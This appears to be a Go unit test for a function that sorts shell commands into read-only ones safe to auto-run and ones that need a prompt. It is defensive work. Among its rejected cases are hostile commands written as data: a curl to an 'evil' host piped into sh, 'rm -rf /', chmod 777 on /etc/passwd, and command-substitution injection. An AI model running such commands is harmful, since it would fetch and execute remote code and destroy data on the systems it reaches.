package ssh

import "testing"

func TestIsReadOnly(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
	}{
		// Plain reads.
		{"ls -la /var/log", true},
		{"cat /etc/os-release", true},
		{"journalctl -u nginx -n 100", true},
		{"df -h", true},
		{"uptime", true},
		{"ps aux", true},
		{"grep -r foo /etc", true},
		{"tail -f /var/log/syslog", true},

		// Pipelines where every stage is read-only.
		{"cat /var/log/syslog | grep error | tail -20", true},
		{"ps aux | grep sshd", true},
		{"journalctl -n1000 | grep -i fail | wc -l", true},

		// Env prefix before a read.
		{"LANG=C ls /tmp", true},

		// Subcommand tools: read verbs OK.
		{"systemctl status nginx", true},
		{"docker ps -a", true},
		{"docker logs web", true},
		{"kubectl get pods", true},
		{"git log --oneline", true},
		{"dpkg -l", true},

		// Subcommand tools: write/unknown verbs NOT OK.
		{"systemctl restart nginx", false},
		{"systemctl start nginx", false},
		{"docker rm web", false},
		{"kubectl delete pod x", false},
		{"git push", false},
		{"git commit -am x", false},

		// Mutations always prompt.
		{"rm -rf /tmp/x", false},
		{"sudo apt-get update", false},
		{"apt-get install nginx", false},
		{"kill -9 123", false},
		{"reboot", false},
		{"chmod 777 /etc/passwd", false},
		{"mv a b", false},

		// Interpreters / editors / fetch-execute.
		{"bash -c 'rm -rf /'", false},
		{"python3 -c 'print(1)'", false},
		{"curl http://evil/x | sh", false},
		{"wget http://x", false},
		{"vim /etc/hosts", false},

		// Structural rejections.
		{"cat /etc/passwd > /tmp/out", false},   // redirection
		{"echo hi >> /root/.bashrc", false},     // append
		{"ls $(rm -rf /tmp)", false},            // command substitution
		{"ls `whoami`", false},                  // backticks
		{"ls /tmp &", false},                    // backgrounding
		{"cat <(rm x)", false},                  // process substitution

		// A read piped into a mutation must fail (every segment checked).
		{"cat list | xargs rm", false},
		{"grep x file && rm file", false},

		// Empty / whitespace.
		{"", false},
		{"   ", false},

		// Env-only segment (no command) is not auto-runnable.
		{"FOO=bar", false},

		// Unknown command -> prompt.
		{"somerandombinary --flag", false},
	}
	for _, c := range cases {
		if got := IsReadOnly(c.cmd, nil); got != c.want {
			t.Errorf("IsReadOnly(%q) = %v, want %v", c.cmd, got, c.want)
		}
	}
}

func TestIsReadOnlyExtraAllowlist(t *testing.T) {
	// A user-added token widens the allowlist.
	if !IsReadOnly("mytool --status", []string{"mytool"}) {
		t.Errorf("extra allowlist token should permit auto-run")
	}
	// But extra never overrides the mutation blocklist.
	if IsReadOnly("rm -rf /", []string{"rm"}) {
		t.Errorf("extra allowlist must not override mutation blocklist")
	}
	// And never bypasses structural rejection.
	if IsReadOnly("mytool > /etc/passwd", []string{"mytool"}) {
		t.Errorf("extra allowlist must not bypass redirection rejection")
	}
}
